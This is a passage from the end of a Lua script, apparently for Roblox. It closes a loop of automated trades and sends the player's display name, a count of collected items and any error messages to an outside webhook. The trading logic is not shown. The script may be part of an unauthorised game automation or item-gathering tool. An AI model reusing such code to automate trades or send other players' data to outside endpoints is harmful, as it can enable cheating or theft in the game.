        task.wait(CONFIG.BETWEEN_TRADES)
    end

    if #grand > 0 then
        webhook("Session complete", 0x8B5CF6, "**" .. lp.DisplayName .. "** - " .. #grand .. " item(s)")
    end
    log("done: " .. #grand)
end

local function boot()
    local ok, err = pcall(run)
    if not ok then
        log("ERROR: " .. tostring(err))
        webhook("Script error", 0xED4245, "`" .. tostring(err) .. "`")
    end
end
task.spawn(boot)
